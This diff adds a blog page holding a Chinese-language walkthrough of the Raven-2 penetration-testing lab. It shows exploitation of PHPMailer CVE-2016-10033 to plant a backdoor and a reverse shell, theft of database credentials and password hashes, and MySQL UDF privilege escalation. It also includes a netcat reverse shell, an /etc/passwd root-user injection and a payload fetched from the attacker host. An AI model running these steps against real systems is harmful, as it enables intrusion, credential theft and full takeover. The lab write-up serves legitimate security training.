@@ -1,0 +1,214 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透:Raven-2 | xxxRetr0</title><meta name="keywords" content="Pentest"><meta name="author" content="xxxRetr0"><meta name="copyright" content="xxxRetr0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1、nmap -sP 192.168.133.0&#x2F;24发现IP：192.168.133.130  2、dirb http:&#x2F;&#x2F;192.168.133.130 枚举发现该目录：&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.133.130&#x2F;vendor&#x2F; http:&#x2F;&#x2F;192.168.133.130&#x2F;vendor&#x2F;PATH  第二个目录获得flag：&#x2F;var&#x2F;www&#x2F;html&#x2F;ve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透:Raven-2">
+<meta property="og:url" content="http://example.com/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/index.html">
+<meta property="og:site_name" content="xxxRetr0">
+<meta property="og:description" content="1、nmap -sP 192.168.133.0&#x2F;24发现IP：192.168.133.130  2、dirb http:&#x2F;&#x2F;192.168.133.130 枚举发现该目录：&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.133.130&#x2F;vendor&#x2F; http:&#x2F;&#x2F;192.168.133.130&#x2F;vendor&#x2F;PATH  第二个目录获得flag：&#x2F;var&#x2F;www&#x2F;html&#x2F;ve">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2024-02-02T14:19:46.000Z">
+<meta property="article:modified_time" content="2024-02-02T14:20:15.021Z">
+<meta property="article:author" content="xxxRetr0">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透:Raven-2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-02-02 22:20:15'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="xxxRetr0" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">xxxRetr0</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透:Raven-2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-02-02T14:19:46.000Z" title="Created 2024-02-02 22:19:46">2024-02-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-02-02T14:20:15.021Z" title="Updated 2024-02-02 22:20:15">2024-02-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透:Raven-2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>1、nmap -sP 192.168.133.0/24<br>发现IP：192.168.133.130<br><img src="https://s2.loli.net/2024/02/01/N6kxnRAY9ImSEpc.png" alt="image-20240201102822086"></p>
+<p><img src="https://s2.loli.net/2024/02/01/VryvionY2GEN7aK.png" alt="image-20240201103042809"></p>
+<p>2、dirb <a target="_blank" rel="noopener" href="http://192.168.133.130/">http://192.168.133.130</a></p>
+<p>枚举发现该目录：<br>==&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://192.168.133.130/vendor/">http://192.168.133.130/vendor/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.133.130/vendor/PATH">http://192.168.133.130/vendor/PATH</a>  第二个目录获得flag：<br>/var/www/html/vendor/<br>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}</p>
+<p><img src="https://s2.loli.net/2024/02/02/o2fY57tVPgzCGdM.png" alt="image-20240201104612329"></p>
+<p>3、<a target="_blank" rel="noopener" href="http://192.168.133.130/vendor/README.md">http://192.168.133.130/vendor/README.md</a><br>枚举获得信息：PHPMailer</p>
+<p><img src="https://s2.loli.net/2024/02/01/8PUd5eBlFVXqf3v.png" alt="image-20240201104555787"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.133.130/vendor/VERSION">http://192.168.133.130/vendor/VERSION</a><br>枚举获得信息：5.2.16<br>这时候去找EXP！</p>
+<p>4、谷歌：PHPMailer 5.2.16 exp<br>CVE-2016-10033<br>点击第一条就能发现：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40974">https://www.exploit-db.com/exploits/40974</a></p>
+<p>searchsploit 40974<br>locate php/webapps/40974.py<br>cp /usr/share/exploitdb/exploits/php/webapps/40974.py .</p>
+<p>将exp考出，需要针对PHPMailer修改参数:<br>41行：改下地址：<a target="_blank" rel="noopener" href="http://192.168.133.130/contact.php">http://192.168.133.130/contact.php</a><br>42行：后门名称：/test.php<br>44行：改下回弹的IP和端口  192.168.133.53  6666<br>47行：改下写入shell的目录：/var/www/html/test.php</p>
+<p><img src="https://s2.loli.net/2024/02/02/xJqw6mQh4sAHeGX.png" alt="image-20240201111523539"></p>
+<p>5、执行exp<br>python3 40974.py<br>如果环境报错按照环境安装：<br>需要安装requests_toolbelt模块，使用命令：pip install requests-toolbelt安装即可，如果没用pip，需要sudo apt-get install python-pip安装即可。</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.133.130/contact.php%EF%BC%8C%E6%AD%A4%E6%97%B6%E5%B0%B1%E4%BC%9A%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6test.php">http://192.168.133.130/contact.php，此时就会生成后门文件test.php</a><br>本地开启监听：nc -vlp 6666<br>访问：<a target="_blank" rel="noopener" href="http://192.168.133.130/test.php">http://192.168.133.130/test.php</a><br>获得反弹shell！</p>
+<p><img src="https://s2.loli.net/2024/02/01/h7mPb8BCJ6yRgci.png" alt="image-20240201111619331"></p>
+<p>从伪shell进入shell：python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+<p>ctrl+c退出shell后需重新执行后门才能再次获取shell，这里通过ctrl+z暂停&gt;&gt;stty raw -echo&gt;&gt;输入fg(不可视)即可回到nc -vlp 6666的shell（这时ctrl+c不会断开）</p>
+<p>6、找寻flag<br>find / -name flag*</p>
+<p>/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png<br>/var/www/flag2.txt<br>发现两个flag！读取：<br>cat /var/www/flag2.txt<br>flag2{6a8ed560f0b5358ecf844108048eb337}</p>
+<p>访问：<br><a target="_blank" rel="noopener" href="http://192.168.133.130/wordpress/wp-content/uploads/2018/11/flag3.png">http://192.168.133.130/wordpress/wp-content/uploads/2018/11/flag3.png</a><br>获得flag3！</p>
+<p><img src="https://s2.loli.net/2024/02/02/KfpGrDYgvcaL4FN.png" alt="image-20240201113437980"></p>
+<p>7、wordpress目录枚举<br>在flag3目录下发现了wordpress目录，然后进行枚举<br>grep “内容” -rn<br>grep “password” -rn wp-config.php</p>
+<p>define(‘DB_USER’, ‘root’);<br>/** MySQL database password */<br>define(‘DB_PASSWORD’, ‘R@v3nSecurity’);<br>获得mysql账号密码信息！</p>
+<p><img src="https://s2.loli.net/2024/02/02/RFQXambMDxKYoJP.png" alt="image-20240201120351366"></p>
+<p><img src="https://s2.loli.net/2024/02/02/Wp9L68VbxTmujhM.png" alt="image-20240201120810844"></p>
+<p>ps aux | grep mysql   —查看mysql进程信息</p>
+<p>root       917  0.1  0.3 1351196 1760 ?        Sl   Jan07   2:09 /usr/sbin/mysqld –basedir=/</p>
+<p><img src="https://s2.loli.net/2024/02/02/4BMJRn8HpdkFKqv.png" alt="image-20240201121020918"></p>
+<p>dpkg -l | grep mysql   –查看历史安装包版本<br>5.5.6</p>
+<p>mysql是root权限运行的，那么接下来就找mysql提权的方法.</p>
+<p>8、mysql UDF 提权<br>UDF 提权、MOF 提权是非常经典的提权方法！</p>
+<hr>
+<p>mysql -uroot -pR@v3nSecurity<br>select version();  —查看版本</p>
+<p>show databases;<br>use wordpress<br>show tables;<br>select * from wp_users;<br>michael：$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0<br>steven：B6X3H3ykawf2oHuPsbjQiih5iJXqad.</p>
+<p><img src="https://s2.loli.net/2024/02/02/e7D2QfE6xKyBXrW.png" alt="image-20240201121431547"></p>
+<p>首先看一下是否满足写入条件：<br>show global variables like ‘secure%’;<br><img src="https://s2.loli.net/2024/02/02/k8HspVeoWjBM5b1.png" alt="image-20240201121659452"><br>1）当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br>2）当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/目录下，此时也无法提权<br>3)当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权!<br>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p>查看插件目录：<br>show variables like ‘%plugin%’;<br><img src="https://s2.loli.net/2024/02/02/1DVJv7e6Yc3lOKp.png" alt="image-20240201121738100"></p>
+<p>查看能否远程登陆：<br>use mysql;<br>select user,host from user;<br><img src="https://s2.loli.net/2024/02/02/mETsQ9wBfgSPpoi.png" alt="image-20240201122057490"><br>发现这里root用户不允许远程登陆，因此不能利用MSF提权。</p>
+<p>谷歌搜索：mysql 5.x UDF exploit  或者  searchsploit udf<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p>
+<p>searchsploit 1518.c<br>cp /usr/share/exploitdb/exploits/linux/local/1518.c /root/桌面 </p>
+<p>┌──(root㉿kali)-[/home/kali/桌面]<br>└─# cp /usr/share/exploitdb/exploits/linux/local/1518.c .</p>
+<p>gcc -g -c 1518.c   —GCC编译.o文件<br>gcc -g -shared -o test.so 1518.o -lc<br>-g 生成调试信息<br>-c 编译（二进制）<br>-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。<br>-o：执行命令后的文件名<br>-lc：-l 库 c库名</p>
+<p>开启http服务：<br>┌──(root㉿kali)-[/home/kali/桌面]<br>└─# python -m http.server 8081</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.133.53:8081/test.so">http://192.168.133.53:8081/test.so</a></p>
+<p><img src="https://s2.loli.net/2024/02/01/fJ5RCrwTvj47Imx.png" alt="image-20240201123456656"></p>
+<p>进入mysql数据库：</p>
+<p>show databases;<br>use mysql<br>select database();</p>
+<p>进入数据库创建数据表test：<br>create table test(line blob);<br>插入数据文件：<br>insert into test values(load_file(‘/tmp/test.so’));</p>
+<p>test表成功插入二进制数据，然后利用dumpfile函数把文件导出，outfile 多行导出，dumpfile一行导出<br>outfile会有特殊的转换，而dumpfile是原数据导出！（普通权限写入，root权限导出）<br>新建存储函数：<br>select * from test into dumpfile ‘/usr/lib/mysql/plugin/test.so’;</p>
+<p>创建自定义函数do_system，类型是integer，别名（soname）文件名字，然后查询函数是否创建成功：<br>create function do_system returns integer soname ‘test.so’;</p>
+<p>查看以下创建的函数：<br>select * from mysql.func;</p>
+<p>调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令：<br>select do_system(‘chmod u+s /usr/bin/find’);</p>
+<p><img src="https://s2.loli.net/2024/02/02/8r9OfyM1hUtmd6D.png" alt="image-20240201125249254"></p>
+<p>执行find命令<br>使用find执行 shell<br>touch test<br>find test -exec “/bin/sh” ;<br>或者：find test -exec “id” ;<br>cd /root<br>cat flag4.txt<br>flag4{df2bc5e951d91581467bb9a2a8ff4425}</p>
+<p><img src="https://s2.loli.net/2024/02/02/tp9ERbi2f6Y7hBP.png" alt="image-20240201125433411"></p>
+<hr>
+<p>mysql -uroot -pR@v3nSecurity<br>show databases;<br>use mysql<br>select database();</p>
+<p>create table test(line blob);<br>insert into test values(load_file(‘/tmp/test.so’));<br>select * from test into dumpfile ‘/usr/lib/mysql/plugin/test.so’;<br>create function do_system returns integer soname ‘test.so’;<br>select * from mysql.func;</p>
+<h2 id="select-do-system-‘chmod-u-s-usr-bin-find’"><a href="#select-do-system-‘chmod-u-s-usr-bin-find’" class="headerlink" title="select do_system(‘chmod u+s /usr/bin/find’);"></a>select do_system(‘chmod u+s /usr/bin/find’);</h2><p>拓展知识点：或者利用sys_exec、sys_eval</p>
+<p>select do_system(‘nc -nv 192.168.133.28 6677 -e /bin/bash’);</p>
+<hr>
+<p>openssl passwd test<br>YpIR51FecR9AY<br>select do_system(‘echo “test:xFzxgAbLwwOOA:0:0:root:/root:/bin/bash” &gt;&gt; /etc/passwd’);<br>su test</p>
+<hr>
+<p>仅限/bin/bash模式：<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>Ctl z<br>stty raw -echo</p>
+<h2 id="fg"><a href="#fg" class="headerlink" title="fg"></a>fg</h2><p>cewl <a target="_blank" rel="noopener" href="http://192.168.133.130/wordpress/">http://192.168.133.130/wordpress/</a> -w user.txt<br>git clone <a target="_blank" rel="noopener" href="https://github.com/Rhynorater/CVE-2018-15473-Exploit.git">https://github.com/Rhynorater/CVE-2018-15473-Exploit.git</a><br>cd CVE-2018-15473-Exploit/</p>
+<p>pip3 install -r requirements.txt</p>
+<h2 id="proxychains-pip3-install-–upgrade-paramiko-2-4-1"><a href="#proxychains-pip3-install-–upgrade-paramiko-2-4-1" class="headerlink" title="proxychains pip3 install –upgrade paramiko==2.4.1"></a>proxychains pip3 install –upgrade paramiko==2.4.1</h2><p>如果可以远程：<br>mysql_udf_payload<br>sqlmap -d “mysql://root:<a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#52;&#x35;&#x2e;&#49;&#x33;&#x30;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#52;&#x35;&#x2e;&#49;&#x33;&#x30;</a>:3306/mysql” –os-shell</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">xxxRetr0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/">http://example.com/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pentest/">Pentest</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">渗透:Lampiao</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透:Lampiao"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-01</div><div class="title">渗透:Lampiao</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xxxRetr0</div><div class="author-info__description">yaHuuuuuu</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxRetr0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#select-do-system-%E2%80%98chmod-u-s-usr-bin-find%E2%80%99"><span class="toc-number">1.</span> <span class="toc-text">select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fg"><span class="toc-number">2.</span> <span class="toc-text">fg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proxychains-pip3-install-%E2%80%93upgrade-paramiko-2-4-1"><span class="toc-number">3.</span> <span class="toc-text">proxychains pip3 install –upgrade paramiko&#x3D;&#x3D;2.4.1</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/" title="渗透:Raven-2"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透:Raven-2"/></a><div class="content"><a class="title" href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/" title="渗透:Raven-2">渗透:Raven-2</a><time datetime="2024-02-02T14:19:46.000Z" title="Created 2024-02-02 22:19:46">2024-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透:Lampiao"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透:Lampiao"/></a><div class="content"><a class="title" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透:Lampiao">渗透:Lampiao</a><time datetime="2024-02-01T12:16:07.000Z" title="Created 2024-02-01 20:16:07">2024-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/VulnHub-DarkHole-1/" title="VulnHub-DarkHole-1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VulnHub-DarkHole-1"/></a><div class="content"><a class="title" href="/2023/04/08/VulnHub-DarkHole-1/" title="VulnHub-DarkHole-1">VulnHub-DarkHole-1</a><time datetime="2023-04-08T12:46:14.000Z" title="Created 2023-04-08 20:46:14">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/BUU-easy-web/" title="BUU-easy_web"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU-easy_web"/></a><div class="content"><a class="title" href="/2023/03/16/BUU-easy-web/" title="BUU-easy_web">BUU-easy_web</a><time datetime="2023-03-16T04:30:08.000Z" title="Created 2023-03-16 12:30:08">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="cve-2018-12613-PhpMyadmin后台文件包含"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cve-2018-12613-PhpMyadmin后台文件包含"/></a><div class="content"><a class="title" href="/2023/03/16/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="cve-2018-12613-PhpMyadmin后台文件包含">cve-2018-12613-PhpMyadmin后台文件包含</a><time datetime="2023-03-16T04:28:02.000Z" title="Created 2023-03-16 12:28:02">2023-03-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By xxxRetr0</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
